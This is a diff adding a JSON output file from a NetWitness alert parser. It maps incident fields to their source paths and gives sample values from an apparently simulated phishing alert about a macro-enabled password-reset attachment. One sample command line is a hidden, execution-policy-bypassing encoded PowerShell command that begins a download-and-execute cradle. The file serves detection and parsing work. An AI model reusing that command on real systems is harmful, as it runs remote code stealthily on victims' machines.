@@ -1,0 +1,517 @@
+{
+    "parser": "fresh_netwitness_parser",
+    "parser_version": "3.2-soc-accurate",
+    "input_format": "incident_details_with_alerts",
+    "selected_alert_index": 0,
+    "selected_alert_id": "ALERT-9001",
+    "selected_alert_raw_evidence": {
+        "raw_meta_key_count": 108,
+        "field_evidence_paths": {
+            "incident_id": [
+                "incident.id"
+            ],
+            "incident_title": [
+                "incident.title"
+            ],
+            "incident_priority": [
+                "incident.priority"
+            ],
+            "incident_risk_score": [
+                "incident.riskScore",
+                "incident.averageAlertRiskScore"
+            ],
+            "alert_id": [
+                "alert.id",
+                "alert.mitre.technique_id",
+                "alert.events[0].event_id",
+                "alert.events[0].email.message_id",
+                "alert.events[1].event_id"
+            ],
+            "alert_name": [
+                "alert.name",
+                "incident.title",
+                "alert.events[0].device.hostname",
+                "alert.events[0].email.attachments[0].filename",
+                "alert.events[0].user.username",
+                "alert.events[0].host.hostname",
+                "alert.events[0].meta.threat.name",
+                "alert.events[0].meta.file.name",
+                "alert.events[1].device.hostname",
+                "alert.events[1].host.hostname",
+                "alert.events[1].user.username",
+                "alert.events[1].process.process_name",
+                "alert.events[1].process.parent_process_name",
+                "alert.events[1].child_process.process_name",
+                "alert.events[1].child_process.parent_process_name",
+                "alert.events[1].meta.process.name",
+                "alert.events[1].meta.process.parent.name"
+            ],
+            "alert_time": [
+                "incident.created",
+                "alert.timestamp",
+                "alert.events[0].event_time",
+                "alert.events[1].event_time"
+            ],
+            "severity": [
+                "alert.severity",
+                "alert.riskScore",
+                "incident.priority",
+                "incident.riskScore",
+                "incident.averageAlertRiskScore"
+            ],
+            "risk_score": [
+                "alert.riskScore",
+                "incident.riskScore",
+                "incident.averageAlertRiskScore"
+            ],
+            "event_type": [
+                "alert.type",
+                "alert.events[0].device.type",
+                "alert.events[0].email.attachments[0].filetype",
+                "alert.events[0].meta.event.type",
+                "alert.events[1].device.type",
+                "alert.events[1].meta.event.type"
+            ],
+            "source_ip": [
+                "alert.events[0].email.sender_ip",
+                "alert.events[0].network.source_ip",
+                "alert.events[1].network.source_ip",
+                "alert.events[0].meta.ip.src",
+                "alert.events[1].meta.ip.src"
+            ],
+            "destination_ip": [
+                "alert.events[0].network.destination_ip",
+                "alert.events[1].network.destination_ip",
+                "alert.events[0].meta.ip.dst",
+                "alert.events[1].meta.ip.dst"
+            ],
+            "source_port": [
+                "alert.events[0].network.source_port",
+                "alert.events[1].network.source_port"
+            ],
+            "destination_port": [
+                "alert.events[0].network.destination_port",
+                "alert.events[1].network.destination_port"
+            ],
+            "protocol": [
+                "alert.events[0].network.protocol",
+                "alert.events[1].network.protocol"
+            ],
+            "direction": [
+                "alert.events[0].network.direction",
+                "alert.events[1].network.direction"
+            ],
+            "username": [
+                "alert.events[0].user.username",
+                "alert.events[1].user.username"
+            ],
+            "source_email": [
+                "alert.events[0].email.from",
+                "alert.events[0].email.reply_to"
+            ],
+            "destination_email": [
+                "alert.events[0].email.to"
+            ],
+            "email": [
+                "alert.events[0].user.email",
+                "alert.events[1].user.email"
+            ],
+            "hostname": [
+                "alert.events[0].device.hostname",
+                "alert.events[0].host.hostname",
+                "alert.events[1].device.hostname",
+                "alert.events[1].host.hostname",
+                "alert.events[0].meta.alias.host",
+                "alert.events[1].meta.alias.host"
+            ],
+            "email_subject": [
+                "alert.events[0].email.subject",
+                "alert.events[0].meta.email.subject"
+            ],
+            "file_name": [
+                "alert.events[0].email.attachments[0].filename",
+                "alert.events[0].meta.file.name"
+            ],
+            "file_hash": [
+                "alert.events[0].email.attachments[0].sha256",
+                "alert.events[0].meta.file.hash.sha256",
+                "alert.events[0].email.attachments[0].sha1",
+                "alert.events[0].meta.file.hash.sha1",
+                "alert.events[0].email.attachments[0].md5",
+                "alert.events[0].meta.file.hash.md5"
+            ],
+            "file_extension": [
+                "alert.events[0].meta.file.extension"
+            ],
+            "file_type": [
+                "alert.events[0].email.attachments[0].filetype"
+            ],
+            "file_size": [
+                "alert.events[0].email.attachments[0].size"
+            ],
+            "mitre_tactic": [
+                "alert.mitre.tactic"
+            ],
+            "mitre_technique": [
+                "alert.mitre.technique"
+            ],
+            "mitre_technique_id": [
+                "alert.mitre.technique_id"
+            ],
+            "url": [
+                "alert.events[0].email.urls[0]"
+            ],
+            "process_name": [
+                "alert.events[1].process.process_name",
+                "alert.events[1].child_process.process_name",
+                "alert.events[1].meta.process.name",
+                "alert.events[1].process.parent_process_name",
+                "alert.events[1].child_process.parent_process_name"
+            ],
+            "process_path": [
+                "alert.events[1].process.process_path",
+                "alert.events[1].child_process.process_path"
+            ],
+            "parent_process_name": [
+                "alert.events[1].process.parent_process_name",
+                "alert.events[1].child_process.parent_process_name",
+                "alert.events[1].meta.process.parent.name"
+            ],
+            "child_process_name": [
+                "alert.events[1].child_process.process_name"
+            ],
+            "child_process_path": [
+                "alert.events[1].child_process.process_path"
+            ],
+            "command_line": [
+                "alert.events[1].process.command_line",
+                "alert.events[1].child_process.command_line",
+                "alert.events[1].meta.process.command_line"
+            ]
+        },
+        "sample_values": {
+            "incident_id": [
+                "INC-9001"
+            ],
+            "incident_title": [
+                "Email with Suspicious Attachment Detected"
+            ],
+            "incident_priority": [
+                "High"
+            ],
+            "incident_risk_score": [
+                85
+            ],
+            "alert_id": [
+                "ALERT-9001",
+                "T1566.001",
+                "EVT-001",
+                "<20260722121622.9001@secure-rp-support.com>",
+                "EVT-002"
+            ],
+            "alert_name": [
+                "Suspicious Email Attachment",
+                "Email with Suspicious Attachment Detected",
+                "NW-MAIL-GW01",
+                "Password_Reset_Form.docm",
+                "jolin_j",
+                "RPSOCWSWin2",
+                "Suspicious Macro Attachment"
+            ],
+            "alert_time": [
+                1753175182981,
+                1753175282981
+            ],
+            "severity": [
+                "High",
+                85
+            ],
+            "risk_score": [
+                85
+            ],
+            "event_type": [
+                "Email Threat",
+                "mail_gateway",
+                "Microsoft Word Macro-Enabled Document",
+                "attachment",
+                "endpoint",
+                "process_creation"
+            ],
+            "source_ip": [
+                "185.199.108.153",
+                "10.100.20.16"
+            ],
+            "destination_ip": [
+                "10.100.10.7",
+                "45.77.88.21"
+            ],
+            "source_port": [
+                443,
+                49821
+            ],
+            "destination_port": [
+                25,
+                443
+            ],
+            "protocol": [
+                "SMTP",
+                "HTTPS"
+            ],
+            "direction": [
+                "inbound",
+                "outbound"
+            ],
+            "username": [
+                "jolin_j"
+            ],
+            "source_email": [
+                "\"IT Support\" <it-support@secure-rp-support.com>",
+                "helpdesk@secure-rp-support.com"
+            ],
+            "destination_email": [
+                "jolin_j@rp-soc.com"
+            ],
+            "email": [
+                "jolin_j@rp-soc.com"
+            ],
+            "hostname": [
+                "NW-MAIL-GW01",
+                "RPSOCWSWin2"
+            ],
+            "email_subject": [
+                "Urgent: Password Expiry Notice"
+            ],
+            "file_name": [
+                "Password_Reset_Form.docm"
+            ],
+            "file_hash": [
+                "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+                "3395856ce81f2b7382dee72602f798b642f14140",
+                "44d88612fea8a8f36de82e1278abb02f"
+            ],
+            "file_extension": [
+                "docm"
+            ],
+            "file_type": [
+                "Microsoft Word Macro-Enabled Document"
+            ],
+            "file_size": [
+                238944
+            ],
+            "mitre_tactic": [
+                "Initial Access"
+            ],
+            "mitre_technique": [
+                "Phishing: Spearphishing Attachment"
+            ],
+            "mitre_technique_id": [
+                "T1566.001"
+            ],
+            "url": [
+                "http://secure-rp-support.com/password-reset"
+            ],
+            "process_name": [
+                "WINWORD.EXE",
+                "powershell.exe",
+                "OUTLOOK.EXE"
+            ],
+            "process_path": [
+                "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            ],
+            "parent_process_name": [
+                "OUTLOOK.EXE",
+                "WINWORD.EXE"
+            ],
+            "child_process_name": [
+                "powershell.exe"
+            ],
+            "child_process_path": [
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            ],
+            "command_line": [
+                "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jolin_j\\Downloads\\Password_Reset_Form.docm\"",
+                "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+            ]
+        },
+        "event_evidence_paths": {
+            "event_0": {
+                "source_path": "events[0]",
+                "field_evidence_paths": {
+                    "alert_id": [
+                        "event.event_id",
+                        "event.email.message_id"
+                    ],
+                    "alert_name": [
+                        "event.device.hostname",
+                        "event.email.attachments[0].filename",
+                        "event.user.username",
+                        "event.host.hostname",
+                        "event.meta.threat.name",
+                        "event.meta.file.name"
+                    ],
+                    "alert_time": [
+                        "event.event_time"
+                    ],
+                    "event_type": [
+                        "event.device.type",
+                        "event.email.attachments[0].filetype",
+                        "event.meta.event.type"
+                    ],
+                    "source_ip": [
+                        "event.email.sender_ip",
+                        "event.network.source_ip",
+                        "event.meta.ip.src"
+                    ],
+                    "destination_ip": [
+                        "event.network.destination_ip",
+                        "event.meta.ip.dst"
+                    ],
+                    "source_port": [
+                        "event.network.source_port"
+                    ],
+                    "destination_port": [
+                        "event.network.destination_port"
+                    ],
+                    "protocol": [
+                        "event.network.protocol"
+                    ],
+                    "direction": [
+                        "event.network.direction"
+                    ],
+                    "username": [
+                        "event.user.username"
+                    ],
+                    "source_email": [
+                        "event.email.from",
+                        "event.email.reply_to"
+                    ],
+                    "destination_email": [
+                        "event.email.to"
+                    ],
+                    "email": [
+                        "event.user.email"
+                    ],
+                    "hostname": [
+                        "event.device.hostname",
+                        "event.host.hostname",
+                        "event.meta.alias.host"
+                    ],
+                    "email_subject": [
+                        "event.email.subject",
+                        "event.meta.email.subject"
+                    ],
+                    "file_name": [
+                        "event.email.attachments[0].filename",
+                        "event.meta.file.name"
+                    ],
+                    "file_hash": [
+                        "event.email.attachments[0].sha256",
+                        "event.meta.file.hash.sha256",
+                        "event.email.attachments[0].sha1",
+                        "event.meta.file.hash.sha1",
+                        "event.email.attachments[0].md5",
+                        "event.meta.file.hash.md5"
+                    ],
+                    "file_extension": [
+                        "event.meta.file.extension"
+                    ],
+                    "file_type": [
+                        "event.email.attachments[0].filetype"
+                    ],
+                    "file_size": [
+                        "event.email.attachments[0].size"
+                    ],
+                    "url": [
+                        "event.email.urls[0]"
+                    ]
+                }
+            },
+            "event_1": {
+                "source_path": "events[1]",
+                "field_evidence_paths": {
+                    "alert_id": [
+                        "event.event_id"
+                    ],
+                    "alert_name": [
+                        "event.device.hostname",
+                        "event.host.hostname",
+                        "event.user.username",
+                        "event.process.process_name",
+                        "event.process.parent_process_name",
+                        "event.child_process.process_name",
+                        "event.child_process.parent_process_name",
+                        "event.meta.process.name",
+                        "event.meta.process.parent.name"
+                    ],
+                    "alert_time": [
+                        "event.event_time"
+                    ],
+                    "event_type": [
+                        "event.device.type",
+                        "event.meta.event.type"
+                    ],
+                    "source_ip": [
+                        "event.network.source_ip",
+                        "event.meta.ip.src"
+                    ],
+                    "destination_ip": [
+                        "event.network.destination_ip",
+                        "event.meta.ip.dst"
+                    ],
+                    "source_port": [
+                        "event.network.source_port"
+                    ],
+                    "destination_port": [
+                        "event.network.destination_port"
+                    ],
+                    "protocol": [
+                        "event.network.protocol"
+                    ],
+                    "direction": [
+                        "event.network.direction"
+                    ],
+                    "username": [
+                        "event.user.username"
+                    ],
+                    "email": [
+                        "event.user.email"
+                    ],
+                    "hostname": [
+                        "event.device.hostname",
+                        "event.host.hostname",
+                        "event.meta.alias.host"
+                    ],
+                    "process_name": [
+                        "event.process.process_name",
+                        "event.child_process.process_name",
+                        "event.meta.process.name",
+                        "event.process.parent_process_name",
+                        "event.child_process.parent_process_name"
+                    ],
+                    "process_path": [
+                        "event.process.process_path",
+                        "event.child_process.process_path"
+                    ],
+                    "parent_process_name": [
+                        "event.process.parent_process_name",
+                        "event.child_process.parent_process_name",
+                        "event.meta.process.parent.name"
+                    ],
+                    "child_process_name": [
+                        "event.child_process.process_name"
+                    ],
+                    "child_process_path": [
+                        "event.child_process.process_path"
+                    ],
+                    "command_line": [
+                        "event.process.command_line",
+                        "event.child_process.command_line",
+                        "event.meta.process.command_line"
+                    ]
+                }
+            }
+        }
+    },
+    "generated_at": "2026-05-30T11:24:17.189519+00:00"
+}
